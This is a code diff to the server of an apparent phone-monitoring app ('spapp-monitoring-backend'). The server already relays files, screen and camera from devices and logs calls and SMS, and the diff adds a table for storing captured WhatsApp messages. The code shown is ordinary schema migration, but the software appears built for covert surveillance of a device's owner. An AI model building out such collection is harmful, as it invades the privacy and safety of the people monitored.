@@ -58,14 +58,31 @@ attachFileRelay(server);
 attachScreenRelay(server);
 attachCameraRelay(server);
 
-// Ensure call_logs & sms_logs have contact_name column
+// Ensure call_logs & sms_logs have contact_name column, and whatsapp_messages table exists
 const pool = require("./db/pool");
 pool
   .query(`
     ALTER TABLE call_logs ADD COLUMN IF NOT EXISTS contact_name VARCHAR(255);
     ALTER TABLE sms_logs ADD COLUMN IF NOT EXISTS contact_name VARCHAR(255);
+
+    CREATE TABLE IF NOT EXISTS whatsapp_messages (
+      id              BIGSERIAL PRIMARY KEY,
+      device_id       UUID NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
+      chat_name       VARCHAR(255) NOT NULL,
+      sender          VARCHAR(255),
+      message_text    TEXT NOT NULL,
+      is_outgoing     BOOLEAN NOT NULL DEFAULT false,
+      message_time    TIMESTAMPTZ NOT NULL,
+      media_type      VARCHAR(50),
+      media_path      TEXT,
+      synced_at       TIMESTAMPTZ NOT NULL DEFAULT now()
+    );
+    CREATE INDEX IF NOT EXISTS idx_whatsapp_messages_device_chat ON whatsapp_messages(device_id, chat_name, message_time DESC);
+    CREATE INDEX IF NOT EXISTS idx_whatsapp_messages_device_time ON whatsapp_messages(device_id, message_time DESC);
+    CREATE UNIQUE INDEX IF NOT EXISTS idx_whatsapp_messages_unique
+      ON whatsapp_messages(device_id, chat_name, message_text, message_time, is_outgoing);
   `)
-  .catch((err) => console.error("Auto-migration (contact_name) warning:", err.message));
+  .catch((err) => console.error("Auto-migration warning:", err.message));
 
 server.listen(PORT, () => {
   console.log(`spapp-monitoring-backend listening on port ${PORT} (HTTP + WS file + screen + camera relay)`);
